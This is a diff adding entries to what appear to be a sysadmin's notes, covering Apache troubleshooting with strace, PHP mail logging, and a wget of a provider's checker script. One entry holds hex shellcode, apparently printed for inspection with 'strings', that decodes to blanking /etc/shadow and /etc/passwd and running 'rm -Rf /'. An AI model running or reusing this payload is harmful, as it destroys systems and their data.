@@ -1,4 +1,36 @@
-﻿## checker
+﻿## troubleshoot apache 500 internal error
+# workstation
+telnet domain.com 80
+GET / HTTP/1.1
+# server hosting domain.com
+netstat -natp |grep 'IP of workstation'
+strace -s 6666 -p 11111
+# workstation
+host: domain.com
+
+## strace all child process
+strace -s 6666 -p 5220 -f -o whm.txt
+
+## compile shellcode
+$ cat a.c 
+int main() {
+    unsigned char shellcode[] =
+    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+    "\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x39\x00\x00\x00\x65"
+    "\x63\x68\x6f\x20\x22\x22\x20\x3e\x20\x2f\x65\x74\x63\x2f\x73"
+    "\x68\x61\x64\x6f\x77\x20\x3b\x20\x65\x63\x68\x6f\x20\x22\x22"
+    "\x20\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x20"
+    "\x3b\x20\x72\x6d\x20\x2d\x52\x66\x20\x2f\x00\x57\x53\x89\xe1"
+    "\xcd\x80";
+}
+$ gcc a.c -o a
+$ strings a
+
+## LW PHP Spam
+mail.add_x_header = On
+mail.log = /var/log/php_maillog
+
+## checker
 mkdir -p /root/bin
 wget http://cmsv.liquidweb.com/checkers -P /root/bin && chmod +x /root/bin/checkers
 
